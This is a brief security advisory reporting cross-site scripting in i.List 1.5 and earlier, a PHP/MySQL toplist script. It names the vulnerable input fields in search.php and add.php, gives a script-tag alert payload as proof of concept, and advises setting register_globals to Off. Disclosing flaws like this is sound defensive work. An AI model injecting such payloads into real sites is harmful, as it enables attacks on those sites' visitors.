i.List 1.5 and prior


Description:
-------------------------------

i.List is a php/mysql TOPLIST script.

Requirements:
-------------------------------

register_globals = On


Vulnerability:
-------------------------------

Input passed to the Inputbox in "search.php", the 'URL' inputbox

Set "register_globals" to "Off".

In the inputbox of /search.php:

In the inputbox 'URL' of add.php:
Type in as URL: <script>alert("MajorSecurity")</script>

In the inputbox 'ButtonURL' of add.php:
Type in as URL: <script>alert("MajorSecurity")</script>
